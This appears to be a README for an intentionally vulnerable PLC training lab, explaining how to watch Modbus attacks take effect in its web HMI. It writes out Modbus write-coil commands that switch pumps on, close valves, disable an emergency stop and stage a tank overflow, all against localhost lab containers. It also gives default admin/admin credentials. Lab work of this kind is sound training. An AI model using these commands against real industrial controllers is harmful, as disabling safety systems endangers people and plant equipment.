# How to See Modbus Attacks in the Web UI

## The Problem
You're doing Modbus attacks but can't see the effects in the web UI. Here's how to see them!

## Quick Start

### 1. Make sure containers are running:
```bash
vuln-plc
# Choose "Start" to start the containers
```

### 2. Open the Web UI
- URL: http://localhost:5000
- Login: `admin` / `admin`

### 3. Go to the **Process** page
- Click "Process" in the navigation menu
- This shows ALL equipment status in real-time
- Refreshes every 2 seconds automatically

## What You'll See

The Process page shows status for all equipment:

```
Pumps:
├─ Pump 1 Status: [true/false]    ← Look here!
├─ Pump 2 Status: [true/false]
└─ Pump 3 Status: [true/false]

Valves:
├─ Valve 1 Status: [true/false]   ← Look here!
├─ Valve 2 Status: [true/false]
├─ Valve 3 Status: [true/false]
└─ Valve 4 Status: [true/false]

Safety:
├─ Emergency Stop: [true/false]   ← Look here!
└─ Safety Interlock: [true/false]

At the bottom:
└─ Full State (JSON) - Shows ALL values
```

## Live Attack Demo

### Attack 1: Turn Pump ON

**Terminal 1 - Run attack:**
```bash
sudo modbus write-coil 127.0.0.1:5502 0 1
```

**Browser - What changes:**
```
Before:  Pump 1 Status: false
After:   Pump 1 Status: true   ← Changed!
```

The web UI shows `pump1_status: true` because the Modbus write changed it!

### Attack 2: Close Valve

**Terminal - Run attack:**
```bash
sudo modbus write-coil 127.0.0.1:5502 3 0
```

**Browser - What changes:**
```
Before:  Valve 1 Status: true
After:   Valve 1 Status: false  ← Changed!
```

### Attack 3: Disable Emergency Stop

**Terminal - Run attack:**
```bash
sudo modbus write-coil 127.0.0.1:5505 0 0
```

**Browser - What changes:**
```
Before:  Emergency Stop: true
After:   Emergency Stop: false  ← DANGER!
```

## How to Verify It's Working

### Method 1: Watch the JSON State (Easiest!)
1. Go to Process page: http://localhost:5000/process
2. Scroll to the bottom
3. Look for "Full State" JSON section
4. Run a Modbus attack in terminal
5. Watch the JSON update (refreshes every 2 seconds)

**Example - Before attack:**
```json
{
  "pump1_status": false,
  "valve1_status": true,
  "emergency_stop": true
}
```

**After running:**
```bash
sudo modbus write-coil 127.0.0.1:5502 0 1
```

**JSON updates to:**
```json
{
  "pump1_status": true,     ← Changed!
  "valve1_status": true,
  "emergency_stop": true
}
```

### Method 2: Watch Browser Network Tab
1. Open browser Dev Tools (F12)
2. Go to "Network" tab
3. Filter for "status"
4. Watch `/api/process/status` calls every 2 seconds
5. Run Modbus attack
6. See the response JSON change

### Method 3: Watch Docker Logs
```bash
sudo docker-compose logs -f plc1
```

When you run attacks, you'll see:
```
[MODBUS] Write Single Coil: addr=0, value=True
[MODBUS] Updated pump1_status = True
```

## Complete Demo Flow

### Terminal 1: Start containers
```bash
vuln-plc
# Choose: Start
```

### Terminal 2: Watch PLC logs
```bash
sudo docker-compose logs -f plc1
```

### Terminal 3: Run attacks
```bash
# Tank Overflow Attack
sudo modbus write-coil 127.0.0.1:5502 0 1   # Pump ON
sudo modbus write-coil 127.0.0.1:5502 3 0   # Valve CLOSED

# Wait 3 seconds...

# Check state file directly
cat /tmp/plc_state.json | jq
```

### Browser: Watch live updates
- URL: http://localhost:5000/process
- Watch values change every 2 seconds
- Scroll to bottom to see full JSON state

## Troubleshooting

### "I don't see any changes!"

**Check 1: Are containers running?**
```bash
sudo docker ps | grep plc
# You should see 4-7 containers running
```

**Check 2: Is the shared state file being created?**
```bash
ls -la /tmp/plc_state.json
# File should exist
```

**Check 3: Can you read the state?**
```bash
cat /tmp/plc_state.json | jq
# Should show JSON with pump_status, valve_status, etc.
```

**Check 4: Is the web page auto-refreshing?**
- Look for "Last Update" timestamp on page
- Should update every 2 seconds
- Try manually refreshing (F5)

**Check 5: Are you logged in?**
- You must login first: admin / admin
- Then navigate to Process or HMI page

### "State file is empty: {}"

This means containers just started. Wait 5 seconds for initialization:
```bash
sleep 5
cat /tmp/plc_state.json | jq
# Should now have data
```

### "I see the logs but web UI doesn't change"

The Modbus attacks ARE working! The web UI might be cached:
1. Hard refresh: Ctrl+Shift+R (or Cmd+Shift+R on Mac)
2. Wait 2-3 seconds for next auto-refresh
3. Check the Network tab in Dev Tools to see fresh data

## Visual Indicators

The web UI shows different visual indicators:

**Pump Status:**
- `true` = Pump is ON (green)
- `false` = Pump is OFF (red)

**Valve Status:**
- `true` = Valve is OPEN (green)
- `false` = Valve is CLOSED (red)

**Safety Systems:**
- `true` = ENABLED (safe, green)
- `false` = DISABLED (danger!, red)

**Tank Levels/Pressures:**
- Numbers that change over time
- Alarms trigger at dangerous levels

## Full Attack Example with Screenshots

```bash
# 1. Start fresh
vuln-plc     # Start containers
sleep 10     # Wait for init

# 2. Open browser to http://localhost:5000/process
#    Take mental note of pump1_status value

# 3. Run attack
sudo modbus write-coil 127.0.0.1:5502 0 1

# 4. Watch browser - within 2 seconds pump1_status flips to true!

# 5. Verify in terminal
cat /tmp/plc_state.json | grep pump1_status
# Output: "pump1_status": true

# 6. Check logs
sudo docker-compose logs plc1 | tail -5
# You'll see: [MODBUS] Updated pump1_status = True
```

## Why This Matters

When you run Modbus attacks:
1. The attack hits the PLC's Modbus server (port 5502-5505)
2. The PLC updates its shared state file (/tmp/plc_state.json)
3. The web UI reads from the same state file every 2 seconds
4. You see the attack's effect in real-time!

**This simulates real industrial systems where:**
- Attackers use Modbus to control PLCs
- Operators watch HMI/SCADA screens
- The HMI shows the attacker's malicious changes
- But operators might not notice until damage occurs!

## Test Your Understanding

Try this challenge:
1. Open Process page in browser
2. Note current pump1_status
3. Run: `sudo modbus write-coil 127.0.0.1:5502 0 1`
4. Watch it change in the browser
5. Run: `sudo modbus write-coil 127.0.0.1:5502 0 0`
6. Watch it change back

If you see the values toggle, congratulations! You're watching live Modbus attacks affect the web UI!
